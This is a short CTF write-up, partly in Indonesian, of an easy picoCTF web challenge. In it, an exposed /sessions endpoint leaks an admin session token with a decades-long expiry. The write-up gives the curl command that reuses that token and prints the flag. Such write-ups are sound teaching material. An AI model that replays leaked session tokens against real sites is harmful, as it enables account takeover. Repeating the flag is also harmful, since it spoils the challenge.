# Writeup: Old Sessions (Challenge ID: 739)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Web Exploitation / Session Management Flaw
- **Difficulty:** Easy
- **Author:** CyLab Academy
- **Event:** picoCTF 2026
- **Points:** 100
- **Flag:** `academy{s3t_s3ss10n_3xp1rat10n5_3fdcb5e2}`

---

## Deskripsi Tantangan
> Proper session timeout controls are critical for securing user accounts. If a user logs in on a public or shared computer but doesn’t explicitly log out (instead simply closing the browser tab), and session expiration dates are misconfigured, the session may remain active indefinitely.
> Your friend tells you to check out a new social media platform he built a few years ago... 'once you login, you never have to log-out again'!

---

## Analisis Kerentanan (Session Exposure & Indefinite Lifetime)
Aplikasi web berjalan di atas framework Flask/Werkzeug dengan cookie `session` yang masa kedaluwarsanya diatur hingga puluhan tahun (tahun 2058).

Pada halaman homepage, komentar user `mary_jones_8992` membocorkan keberadaan endpoint tersembunyi:
> "Hey I found a strange page at /sessions"

### Langkah Eksploitasi
1. Lakukan registrasi dan login dengan akun biasa.
2. Akses endpoint `/sessions` yang mengekspos semua sesi aktif pengguna sistem:
   ```text
   1) session:Zuz0UQxb7YI43MSfvuqU5xIjlbdIz21QQgkbllKPYR4, {'_permanent': True, 'key': 'admin'}
   ```
3. Ganti cookie sesi browser menjadi session token milik `admin`:
   ```bash
   curl -s -H "Cookie: session=Zuz0UQxb7YI43MSfvuqU5xIjlbdIz21QQgkbllKPYR4" http://xebec.cylabacademy.net:22990/
   ```
4. Respons halaman homepage admin merender flag:
   ```html
   <p class="flag-message">academy{s3t_s3ss10n_3xp1rat10n5_3fdcb5e2}</p>
   ```
